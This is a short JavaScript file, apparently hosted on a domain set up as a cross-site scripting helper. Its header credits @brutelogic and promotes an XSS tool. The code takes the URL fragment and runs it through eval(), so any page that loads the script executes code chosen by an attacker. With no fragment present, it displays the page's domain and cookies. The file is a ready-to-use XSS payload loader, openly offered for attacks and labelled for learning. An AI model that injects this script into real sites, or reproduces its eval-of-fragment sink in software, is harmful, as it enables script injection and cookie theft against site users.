/* =================================== !/

X55 is... Cross-Site Scripting!

Please check below on how to use this domain for XSS:
https://twitter.com/brutelogic/status/1488523712244637708

By @brutelogic
Visit https://knoxss.pro for best XSS tool out there.

/! =================================== */

if (document.location.hash) {
   var frag = document.location.hash.match(/[^#][^#]*/)[0];
}

if (frag) {

  try {

    eval(frag);

  } catch(e) {

    alert("URL fragment (#) contains invalid JS code, try again!");
  }

} else {

  alert('Context Domain: '+document.domain+'\n\nReadable Cookies: \n'+document.cookie);

}

// #hack2learn
